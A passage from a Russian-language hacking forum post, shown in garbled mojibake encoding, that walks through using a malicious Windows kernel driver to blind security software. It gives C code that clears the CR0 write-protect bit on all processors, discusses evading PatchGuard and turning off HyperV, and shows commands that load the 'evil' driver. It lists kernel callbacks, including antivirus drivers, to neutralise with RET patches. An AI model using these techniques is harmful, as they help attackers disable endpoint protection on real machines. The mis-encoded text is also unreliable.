-pt &lt;–∏–Ω–¥–µ–∫—Å&gt; –ò—Å–ø—Ä–∞–≤–∏—Ç—å –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–π –∫–æ–ª–ª–±—ç–∫ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –ø–æ—Ç–æ–∫–µ (–†–µ–∂–∏–º —É–≥—Ä–æ–∑—ã –∞–∫—Ç–µ—Ä–∞).
-rt &lt;–∏–Ω–¥–µ–∫—Å&gt; –í–µ—Ä–Ω—É—Ç—å—Å—è –∫ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–º—É –∫–æ–ª–ª–±—ç–∫—É —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –ø–æ—Ç–æ–∫–µ (–†–µ–∂–∏–º –∑–∞–¥—É–º—á–∏–≤–æ–≥–æ –Ω–∏–Ω–¥–∑—è).

&lt;–ö–æ–ª–ª–±—ç–∫–∏ –∑–∞–≥—Ä—É–∑–∫–∏ –æ–±—Ä–∞–∑–æ–≤&gt;

-zl –û–±–Ω—É–ª–∏—Ç—å –º–∞—Å—Å–∏–≤ –∫–æ–ª–ª–±—ç–∫–æ–≤ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π –æ –∑–∞–≥—Ä—É–∑–∫–µ –æ–±—Ä–∞–∑–æ–≤ (–†–µ–∂–∏–º –∫–æ–≤–±–æ—è).
-dl &lt;–∏–Ω–¥–µ–∫—Å&gt; –£–¥–∞–ª–∏—Ç—å –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–π –∫–æ–ª–ª–±—ç–∫ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –∑–∞–≥—Ä—É–∑–∫–µ –æ–±—Ä–∞–∑–∞ (–†–µ–∂–∏–º –∫—Ä–∞—Å–Ω–æ–π –∫–æ–º–∞–Ω–¥—ã).
-pl &lt;–∏–Ω–¥–µ–∫—Å&gt; –ò—Å–ø—Ä–∞–≤–∏—Ç—å –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–π –∫–æ–ª–ª–±—ç–∫ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –∑–∞–≥—Ä—É–∑–∫–µ –æ–±—Ä–∞–∑–∞ (–†–µ–∂–∏–º —É–≥—Ä–æ–∑—ã –∞–∫—Ç–µ—Ä–∞).
-rl &lt;–∏–Ω–¥–µ–∫—Å&gt; –í–µ—Ä–Ω—É—Ç—å—Å—è –∫ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–º—É –∫–æ–ª–ª–±—ç–∫—É —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –∑–∞–≥—Ä—É–∑–∫–µ –æ–±—Ä–∞–∑–∞ (–†–µ–∂–∏–º –∑–∞–¥—É–º—á–∏–≤–æ–≥–æ –Ω–∏–Ω–¥–∑—è).</code></pre>
	</div>
</div><br />
–ö–∞–∫ –≤–∏–¥–∏—Ç–µ –æ–ø—Ü–∏–π –º–Ω–æ–≥–æ,  –ø–æ—ç—Ç–æ–º—É —è –ø—Ä–æ—Å—Ç–æ –≤—ã–¥–µ–ª—é –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –∏–∑–º–µ–Ω–µ–Ω–∏—è/–≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω–æ–≥–æ –∫–æ–ª–ª–±—ç–∫–∞ —Å –ø–æ–º–æ—â—å—é –∫–æ–º–∞–Ω–¥ rp –∏–ª–∏ rt –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç —Ç–æ–≥–æ, –æ—Ç–Ω–æ—Å–∏—Ç—Å—è –ª–∏ –æ–Ω –∫ –ø—Ä–æ—Ü–µ—Å—Å—É –∏–ª–∏ –ø–æ—Ç–æ–∫—É.<br />
<br />
–ú—ã –¥–æ–ª–∂–Ω—ã –ø–æ–º–Ω–∏—Ç—å, —á—Ç–æ —ç—Ç–∞ –±–∏—Ç–≤–∞ –≤–µ–¥–µ—Ç—Å—è –º–µ–∂–¥—É –¥–≤—É–º—è —Å—É—â–Ω–æ—Å—Ç—è–º–∏, —Ä–∞–±–æ—Ç–∞—é—â–∏–º–∏ –Ω–∞ –æ–¥–Ω–æ–º –∏ —Ç–æ–º –∂–µ —É—Ä–æ–≤–Ω–µ ring0.<br />
<b><u>–¢–∞–∫ —á—Ç–æ, –∫–∞–∫ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ, –∑–ª–æ–≤—Ä–µ–¥–Ω—ã–π –¥—Ä–∞–π–≤–µ—Ä –±—É–¥–µ—Ç —É—Å–ø–µ—à–µ–Ω —Ç–æ–ª—å–∫–æ –Ω–∞ —Å–∏—Å—Ç–µ–º–∞—Ö –±–µ–∑ –≤–∫–ª—é—á–µ–Ω–Ω–æ–≥–æ HyperV.<br />
<br />
–ï—Å–ª–∏ –Ω–∞ —Å–∏—Å—Ç–µ–º–µ –≤–∫–ª—é—á–µ–Ω HyperV, –æ–Ω –æ–±–Ω–∞—Ä—É–∂–∏—Ç –ª—é–±—ã–µ –∏–∑–º–µ–Ω–µ–Ω–∏—è –≤ —è–¥—Ä–µ –∏–ª–∏ –¥—Ä–∞–π–≤–µ—Ä–µ –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è </u></b>–∏ –Ω–µ–º–µ–¥–ª–µ–Ω–Ω–æ —Ä–∞–∑—Ä—É—à–∏—Ç –Ω–∞—à–∏ –º–µ—á—Ç—ã —Å–∏–Ω–∏–º —ç–∫—Ä–∞–Ω–æ–º —Å–º–µ—Ä—Ç–∏ System Service Exception BSOD.<br />
–¢–µ–º –≤—Ä–µ–º–µ–Ω–µ–º, —á—Ç–æ–±—ã –ø—Ä–æ–¥–æ–ª–∂–∞—Ç—å –∏–≥—Ä–∞—Ç—å —Å –Ω–∞—à–∏–º –¥—Ä–∞–π–≤–µ—Ä–æ–º, –Ω–∞–º –Ω—É–∂–Ω–æ –æ—Ç–∫–ª—é—á–∏—Ç—å –≥–∏–ø–µ—Ä–≤–∏–∑–æ—Ä —Å –ø–æ–º–æ—â—å—é bcdedit /set hypervisorlaunchtype off –∏ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å —Å–∏—Å—Ç–µ–º—É.<br />
<br />
<b><u>–¢–µ–º –Ω–µ –º–µ–Ω–µ–µ, –Ω–∞–º –≤—Å–µ –µ—â–µ –Ω—É–∂–Ω–æ –Ω–∞–π—Ç–∏ –º–µ—Ç–æ–¥, —á—Ç–æ–±—ã –Ω–∞—à–µ –∏–∑–º–µ–Ω–µ–Ω–∏–µ —è–¥—Ä–∞ –º–æ–≥–ª–æ —Å–æ—Å—É—â–µ—Å—Ç–≤–æ–≤–∞—Ç—å —Å KPP</u></b>, —Ç–∞–∫–∂–µ –∏–∑–≤–µ—Å—Ç–Ω—ã–º –∫–∞–∫ PatchGuard. –ö–æ—Ä–æ—á–µ –≥–æ–≤–æ—Ä—è, KPP –ø—ã—Ç–∞–µ—Ç—Å—è –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—Ç–∏—Ç—å –ª—é–±—ã–µ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏ –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏ –≤–∞–∂–Ω—ã—Ö —Å—Ç—Ä—É–∫—Ç—É—Ä —è–¥—Ä–∞, –≤—ã–∑—ã–≤–∞—è –ø—Ä–æ–≤–µ—Ä–∫—É –Ω–∞ –æ—à–∏–±–∫–∏ –ø—Ä–∏ –ª—é–±–æ–π –ø–æ–ø—ã—Ç–∫–µ —ç—Ç–æ —Å–¥–µ–ª–∞—Ç—å.<br />
–¢–µ–º –Ω–µ –º–µ–Ω–µ–µ, —ç—Ç–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è –Ω–µ—Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–º–∏ —Ç–∞–π–º–µ—Ä–∞–º–∏, –∫–∞–∫ —É–∂–µ –±—ã–ª–æ –∑–∞–¥–æ–∫—É–º–µ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–æ –≤–æ –º–Ω–æ–≥–∏—Ö –º–µ—Å—Ç–∞—Ö, –≤ —á–∞—Å—Ç–Ω–æ—Å—Ç–∏, –Ω–∞ <a href="http://www.uninformed.org/?v=6&amp;a=1&amp;t=sumry" target="_blank" class="link link--external" rel="noopener">uninformed</a> –∏ <a href="https://blog.tetrane.com/downloads/Tetrane_PatchGuard_Analysis_RS4_v1.01.pdf" target="_blank" class="link link--external" rel="noopener">tetrane</a>.<br />
<b><u>–ú—ã —É–≤–∏–¥–∏–º, –∫–∞–∫ –æ–±–æ–π—Ç–∏ PatchGuard —á—É—Ç—å –ø–æ–∑–∂–µ.)</u><br />
<br />
–ü–æ–¥–∞–≤–ª–µ–Ω–∏–µ WriteProtect</b><br />
<br />
–ü—Ä–µ–ø—è—Ç—Å—Ç–≤–∏–µ, —Å –∫–æ—Ç–æ—Ä—ã–º –Ω–∞–º –ø—Ä–µ–¥—Å—Ç–æ–∏—Ç —Å—Ç–æ–ª–∫–Ω—É—Ç—å—Å—è, –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —Ç–æ–º, —á—Ç–æ –Ω–∞—à–∏ —Ü–µ–ª–µ–≤—ã–µ –∫–æ–ª–ª–±—ç–∫–∏ –Ω–∞—Ö–æ–¥—è—Ç—Å—è –≤ —Å—Ç—Ä–∞–Ω–∏—Ü–∞—Ö –ø–∞–º—è—Ç–∏ —è–¥—Ä–∞ —Ç–æ–ª—å–∫–æ –¥–ª—è —á—Ç–µ–Ω–∏—è. –ò —ç—Ç–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã —è–≤–Ω–æ –Ω–µ –º–æ–≥—É—Ç –±—ã—Ç—å –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω—ã –Ω–∞—à–∏–º –ø–∞—Ç—á–µ–º.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>lkd&gt; !pte 0xfffff80267fdd670
                                           VA fffff80267fdd670
PXE at FFFF85C2E170BF80    PPE at FFFF85C2E17F0048    PDE at FFFF85C2FE0099F8    PTE at FFFF85FC0133FEE8
contains 0000000005108063  contains 0000000005109063  contains 0000000005219063  contains 09000000035C5021
pfn 5108      ---DA--KWEV  pfn 5109      ---DA--KWEV  pfn 5219      ---DA--KWEV  pfn 35c5      ----A--KREV</code></pre>
	</div>
</div><br />
PTE –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –¥–ª—è —á—Ç–µ–Ω–∏—è (—Ñ–ª–∞–≥ R –≤ ----A--KREV), –∏ –µ—Å–ª–∏ –º—ã –Ω–∞—Å—Ç–æ–ª—å–∫–æ —É–ø—Ä—è–º—ã, —á—Ç–æ–±—ã –≤–º–µ—à–∏–≤–∞—Ç—å—Å—è –≤ —ç—Ç–æ, –º—ã —Å—Ç–æ–ª–∫–Ω–µ–º—Å—è —Å —Å–∏–Ω–∏–º —ç–∫—Ä–∞–Ω–æ–º —Å–º–µ—Ä—Ç–∏ (BSOD).<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797096111.png"
		data-src="https://osint42.org/attachments/1746797096111-png.335/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797096111-png.335/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797096111.png"
			title="1746797096111.png"
			width="535" height="386" loading="lazy" />
	</div><br />
<br />
–ù—É, –∫–∞–∫ –∂–µ –Ω–∞–º —Å–¥–µ–ª–∞—Ç—å –Ω–∞—à—É —Å—Ç—Ä–∞–Ω–∏—Ü—É –¥–æ—Å—Ç—É–ø–Ω–æ–π –¥–ª—è –∑–∞–ø–∏—Å–∏? –ù–∞—à —Å–≤—è—Ç–æ–π –ì—Ä–∞–∞–ª—å - —ç—Ç–æ —Ä–µ–≥–∏—Å—Ç—Ä CR0, –∫–æ—Ç–æ—Ä—ã–π —è–≤–ª—è–µ—Ç—Å—è –æ–¥–Ω–∏–º –∏–∑ –¥—Ä—É–≥–∏—Ö —É–ø—Ä–∞–≤–ª—è—é—â–∏—Ö —Ä–µ–≥–∏—Å—Ç—Ä–æ–≤, –æ—Ç–≤–µ—á–∞—é—â–∏—Ö –∑–∞ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Ä–µ–∂–∏–º–∞ —Ä–∞–±–æ—Ç—ã –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–∞ –∏ —Ö–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫ —Ç–µ–∫—É—â–µ–≥–æ –ø–æ—Ç–æ–∫–∞. –ë–∏—Ç –Ω–æ–º–µ—Ä 16 —ç—Ç–æ–≥–æ —Ä–µ–≥–∏—Å—Ç—Ä–∞ - —ç—Ç–æ —Ñ–ª–∞–≥ WP (Write Protect), –∫–æ—Ç–æ—Ä—ã–π –Ω–∞–º –Ω—É–∂–Ω–æ —Å–±—Ä–æ—Å–∏—Ç—å. –ó–∞—Ç–µ–º –º—ã &quot;–æ—Ç—Ä–∞–≤–ª—è–µ–º&quot; 16-–π –±–∏—Ç CR0, –∏—Å–ø–æ–ª—å–∑—É—è —Å–ª–µ–¥—É—é—â–∏–π MDL (Memory Descriptor List) –∫–∞–∫ —Å—Ç—Ä—É–∫—Ç—É—Ä—É –¥–ª—è –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏—è —Ä–∞–∑–º–µ—Ç–∫–∏ —Ä–µ–≥–∏—Å—Ç—Ä–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef union {
    struct {
        UINT64 protection_enable : 1;
        UINT64 monitor_coprocessor : 1;
        UINT64 emulate_fpu : 1;
        UINT64 task_switched : 1;
        UINT64 extension_type : 1;
        UINT64 numeric_error : 1;
        UINT64 reserved_1 : 10;
        UINT64 write_protect : 1;
        UINT64 reserved_2 : 1;
        UINT64 alignment_mask : 1;
        UINT64 reserved_3 : 10;
        UINT64 not_write_through : 1;
        UINT64 cache_disable : 1;
        UINT64 paging_enable : 1;
    };

    UINT64 flags;
} cr0;</code></pre>
	</div>
</div><br />
–ò —É–¥–∞–ª—è–µ–º —Ñ–ª–∞–≥ –∑–∞—â–∏—Ç—ã –æ—Ç –∑–∞–ø–∏—Å–∏ –∏–∑ CR0.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>void CR0_WP_OFF_x64()
{
    cr0 mycr0;
    mycr0.flags = __readcr0();
    mycr0.write_protect = 0;
    __writecr0(mycr0.flags);
}</code></pre>
	</div>
</div><br />
<br />
–ù–µ –∑–∞–±—ã–≤–∞—è –ø—Ä–∏–º–µ–Ω–∏—Ç—å –∏–∑–º–µ–Ω–µ–Ω–∏–µ –Ω–∞ –∫–∞–∂–¥–æ–º –ª–æ–≥–∏—á–µ—Å–∫–æ–º –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–µ:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int LogicalProcessorsCount = KeQueryActiveProcessorCount

for (ULONG64 processorIndex = 0; processorIndex &lt; LogicalProcessorsCount; processorIndex++)
{
    KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 &lt;&lt; processorIndex));
    CR0_WP_OFF_x64();
    KeRevertToUserAffinityThreadEx(oldAffinity);
}</code></pre>
	</div>
</div><br />
<u><b>–ö–∞–∫-–∂–µ –æ–±–æ–π—Ç–∏ </b></u><b><u><b><u>PatchGuard:</u></b></u></b><br />
<br />
–ú—ã –º–æ–∂–µ–º –ø–æ—Å—Ç—Ä–æ–∏—Ç—å –Ω–∞—à—É —Å—Ç—Ä–∞—Ç–µ–≥–∏—é –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã –¥–∞–Ω–Ω—ã—Ö —è–¥—Ä–∞ –≤–æ–∫—Ä—É–≥ —Å–ª–µ–¥—É—é—â–∏—Ö –ø—É–Ω–∫—Ç–æ–≤:<br />
<ol>
<li data-xf-list-type="ol">–û—á–∏—Å—Ç–∏—Ç—å –±–∏—Ç WP –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ —Ç–æ–ª—å–∫–æ –¥–ª—è –∑–∞–ø–∏—Å–∏ –Ω–∞ –∫–∞–∂–¥–æ–º —è–¥—Ä–µ</li>
<li data-xf-list-type="ol">–°–¥–µ–ª–∞—Ç—å –Ω–∞—à–µ –¥–µ–ª–æ</li>
<li data-xf-list-type="ol">–í–æ—Å—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –±–∏—Ç WP</li>
</ol>–ú—ã –º–æ–≥–ª–∏ –±—ã –¥–æ—Å—Ç–∏—á—å —Ç–æ–π –∂–µ —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏–∏ –ø—Ä–∏–º–∏—Ç–∏–≤–æ–≤:<br />
<br />
–ú–µ—Ç–æ–¥ –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ Deferred Procedure Calls (DPC), –º–µ—Ö–∞–Ω–∏–∑–º–∞ –≤ —è–¥—Ä–µ Windows, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∑–≤–æ–ª—è–µ—Ç –æ—Ç–ª–æ–∂–∏—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –æ–ø—Ä–µ–¥–µ–ª—ë–Ω–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π –¥–æ –±–æ–ª–µ–µ –ø–æ–¥—Ö–æ–¥—è—â–µ–≥–æ –≤—Ä–µ–º–µ–Ω–∏, –∫–æ–≥–¥–∞ —É—Ä–æ–≤–µ–Ω—å –ø—Ä–µ—Ä—ã–≤–∞–Ω–∏–π (IRQL) –ø–æ–∑–≤–æ–ª—è–µ—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —ç—Ç–∏—Ö –∑–∞–¥–∞—á. –ò—Å–ø–æ–ª—å–∑—É—è DPC, –º—ã –º–æ–∂–µ–º —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∏—Ä–æ–≤–∞—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–¥–∞ –Ω–∞ –≤—Å–µ—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–∞—Ö —Å–∏—Å—Ç–µ–º—ã, —á—Ç–æ–±—ã –≤—Ä–µ–º–µ–Ω–Ω–æ –æ—Ç–∫–ª—é—á–∏—Ç—å —Ñ–ª–∞–≥ –∑–∞—â–∏—Ç—ã –æ—Ç –∑–∞–ø–∏—Å–∏ (WP) –≤ —Ä–µ–≥–∏—Å—Ç—Ä–µ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è CR0 –∫–∞–∂–¥–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–∞.<b> –≠—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞—Ç—å –∑–∞—â–∏—â—ë–Ω–Ω—ã–µ –æ–±–ª–∞—Å—Ç–∏ –ø–∞–º—è—Ç–∏ —è–¥—Ä–∞, –Ω–µ –≤—ã–∑—ã–≤–∞—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è PatchGuard.<br />
<br />
<u>–ö–∞–∫-–∂–µ –∑–∞–≥—Ä—É–∑–∏—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–æ–Ω—ã–π –¥—Ä–∞–π–≤–µ—Ä ?</u></b><br />
<br />
–ß—Ç–æ –µ—Å–ª–∏ –∑–∞–∫–æ–Ω–Ω–æ –ø–æ–¥–ø–∏—Å–∞–Ω–Ω—ã–π –¥—Ä–∞–π–≤–µ—Ä —É—è–∑–≤–∏–º –¥–ª—è —É—è–∑–≤–∏–º–æ—Å—Ç–∏ —Ç–∏–ø–∞ Write-What-Where, –∫–æ—Ç–æ—Ä–∞—è –ø–æ–∑–≤–æ–ª—è–µ—Ç –Ω–∞–º –ø–µ—Ä–µ–∑–∞–ø–∏—Å—ã–≤–∞—Ç—å –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ –ø–∞–º—è—Ç–∏ —è–¥—Ä–∞ –∏ –æ—Ç–∫–ª—é—á–∏—Ç—å –ø—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω—É—é –ø—Ä–æ–≤–µ—Ä–∫—É –ø–æ–¥–ø–∏—Å–∏ –¥—Ä–∞–π–≤–µ—Ä–æ–≤?<br />
<br />
–ù–∞ –ø—Ä–æ—Ç—è–∂–µ–Ω–∏–∏ –º–Ω–æ–≥–∏—Ö –ª–µ—Ç —ç—Ç–æ –±—ã–ª —Å–ª—É—á–∞–π —Å –∏–∑–≤–µ—Å—Ç–Ω—ã–º —É—è–∑–≤–∏–º—ã–º –¥—Ä–∞–π–≤–µ—Ä–æ–º Gigabyte, –∫–æ—Ç–æ—Ä—ã–π –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª—Å—è –¥–ª—è —Ä–∞–∑–ª–∏—á–Ω—ã—Ö —Ü–µ–ª–µ–π, –æ—Ç –æ—Ç–∫–ª—é—á–µ–Ω–∏—è –∞–Ω—Ç–∏—á–∏—Ç-—Å–∏—Å—Ç–µ–º –≤–∏–¥–µ–æ–∏–≥—Ä –¥–æ –≤—ã–º–æ–≥–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ –ü–û.<br />
–ú–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –º–∞–ø–µ—Ä—ã, –∫–æ—Ç–æ—Ä—ã–µ –æ–ø–∏—Å–∞–Ω—ã –∑–¥–µ—Å—å:–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ: –ö–∞–∫ —è RootKit –∑–∞–≥—Ä—É–∂–∞–ª –∏–ª–∏ –∂–µ –∫–∞–∫ –∑–∞–≥—Ä—É–∑–∏—Ç—å –¥—Ä–∞–π–≤–µ—Ä –±–µ–∑ –ø–æ–¥–ø–∏—Å–∏ | –¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot;<br />
<br />
<b><u>–î–∞–≤–∞–π—Ç–µ –ø–µ—Ä–µ–π–¥–µ–º –∫ –ø—Ä–∞–∫—Ç–∏–∫–µ –∏ –ø–æ–ø—Ä–æ–±—É–µ–º –º–µ—Ç–æ–¥–∏–∫—É –æ–ø–∏—Å–∞–Ω–Ω—É—é –≤—ã—à–µ –Ω–∞ –ø—Ä–∏–º–µ—Ä–∞—Ö:</u></b><br />
<br />
1)–ó–∞–≥—Ä—É–∑–∏—Ç–µ –Ω–∞—à –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –¥—Ä–∞–π–≤–µ—Ä, —Å–¥–µ–ª–∞—Ç—å —ç—Ç–æ –º–æ–∂–Ω–æ —á–µ—Ä–µ–∑ –º–∞–ø–µ—Ä—ã, –Ω–æ –¥–ª—è —Ç–µ—Å—Ç–∞ –º–æ–∂–Ω–æ –≤—Ä–µ–º–µ–Ω–Ω–æ –æ—Ç–∫–ª—é—á–∏—Ç—å –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ü–∏—Ñ—Ä–æ–≤–æ–π –ø–æ–¥–ø–∏—Å–∏ –∏ —Ç.–¥.:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>sc create evil type= kernel binPath= c:\path\to\file\evildriver.sys
sc start evil</code></pre>
	</div>
</div><br />
2)–í–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤—É–π—Ç–µ —Å –∑–ª–æ–≤—Ä–µ–¥–Ω—ã–º –¥—Ä–∞–π–≤–µ—Ä–æ–º, –ø—Ä–æ–≤–µ—Ä—è—è –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –∫–æ–ª–ª–±—ç–∫–∏ –≤ —Å–∏—Å—Ç–µ–º–µ:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>C:\Users\matteo\Desktop\Debug&gt;evilcli.exe -l
[00] 0xfffff8012154a340 (ntoskrnl.exe + 0x34a340)
[01] 0xfffff801250f4dc0 (cng.sys + 0x14dc0)
[02] 0xfffff80125548610 (klupd_klif_arkmon.sys + 0x18610)
[03] 0xfffff80124f3d870 (ksecdd.sys + 0x1d870)
[04] 0xfffff80126390960 (tcpip.sys + 0x60960)
[05] 0xfffff801269ed930 (iorate.sys + 0xd930)
[06] 0xfffff80125067fc0 (CI.dll + 0x77fc0)
[07] 0xfffff80127161600 (klflt.sys + 0x11600)
[08] 0xfffff801272189d0 (dxgkrnl.sys + 0x89d0)
[09] 0xfffff801283d47f0 (kldisk.sys + 0x47f0)
[10] 0xfffff80127ac9e90 (vm3dmp.sys + 0x9e90)
[11] 0xfffff801294e3ce0 (peauth.sys + 0x43ce0)
[12] 0xfffff8012531f9a0 (mssecflt.sys + 0x1f9a0)</code></pre>
	</div>
</div><br />
–û—Ç–∫–ª—é—á–∏—Ç–µ –Ω—É–∂–Ω—ã–π –∫–æ–ª–ª–±—ç–∫, —Ä–∞–∑–º–µ—Å—Ç–∏–≤ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é RET (C3) –Ω–∞ —Ç–æ–º –∂–µ —Å–º–µ—â–µ–Ω–∏–∏. –¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, –∫–æ–ª–ª–±—ç–∫ –ø—Ä–æ—Å—Ç–æ –≤–µ—Ä–Ω—ë—Ç—Å—è –∫ –≤—ã–∑—ã–≤–∞—é—â–µ–º—É –∏ –ø—Ä–æ–ø—É—Å—Ç–∏—Ç –≤–µ—Å—å –ø–æ—Å–ª–µ–¥—É—é—â–∏–π –∫–æ–¥.<br />
<br />
<b><u>–ù–µ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –¥—Ä—É–≥–∏–µ –æ–ø—Ü–∏–∏ (-z –∏–ª–∏ -d), —Ç–∞–∫ –∫–∞–∫ –æ–Ω–∏ –º–æ–≥—É—Ç –ø–æ–≤—Ä–µ–¥–∏—Ç—å —Å–∏—Å—Ç–µ–º—É.</u></b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
